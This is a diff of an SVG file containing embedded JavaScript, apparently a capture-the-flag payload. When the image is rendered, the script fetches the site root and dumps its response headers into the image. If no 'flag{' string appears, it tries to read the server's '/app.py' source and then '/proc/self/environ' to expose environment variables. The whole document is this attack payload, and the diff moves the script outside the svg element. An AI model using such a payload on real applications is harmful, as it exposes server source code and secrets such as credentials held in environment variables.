@@ -1,46 +1,44 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-  <rect width="1000" height="1000" fill="white"/>
+  <rect width="1000" height="1000" fill="white" />
   <text id="flagText" x="10" y="50" font-size="20" fill="black">Loading...</text>
-  <script type="text/javascript">
-    // First try to get the flag from the server's response
+</svg>
+
+<script type="text/javascript">
+  window.onload = () => {
+    const flagText = document.getElementById('flagText');
+
     fetch('/')
       .then(response => {
-        // Log all headers
         let headers = '';
         for (let pair of response.headers.entries()) {
           headers += `${pair[0]}: ${pair[1]}\n`;
         }
-        document.getElementById('flagText').textContent = `Headers:\n${headers}`;
-        
-        // Try to get the flag from the response
+        flagText.textContent = `Headers:\n${headers}`;
         return response.text();
       })
       .then(text => {
-        // Check if the flag is in the response
         if (text.includes('flag{') || text.includes('FLAG{')) {
-          document.getElementById('flagText').textContent = `Found flag in response:\n${text}`;
+          flagText.textContent = `Found flag in response:\n${text}`;
         } else {
-          // Try to access the flag through the server's source
           fetch('/app.py')
             .then(r => r.text())
             .then(code => {
-              document.getElementById('flagText').textContent = `Server code:\n${code}`;
+              flagText.textContent = `Server code:\n${code}`;
             })
             .catch(() => {
-              // If that fails, try to read environment variables
               fetch('/proc/self/environ')
                 .then(r => r.text())
                 .then(env => {
-                  document.getElementById('flagText').textContent = `Environment:\n${env}`;
+                  flagText.textContent = `Environment:\n${env}`;
                 })
                 .catch(() => {
-                  document.getElementById('flagText').textContent = 'Could not find flag in common locations';
+                  flagText.textContent = 'Could not find flag in common locations';
                 });
             });
         }
       })
       .catch(error => {
-        document.getElementById('flagText').textContent = `Error: ${error}`;
+        flagText.textContent = `Error: ${error}`;
       });
-  </script>
-</svg> 
+  };
+</script>
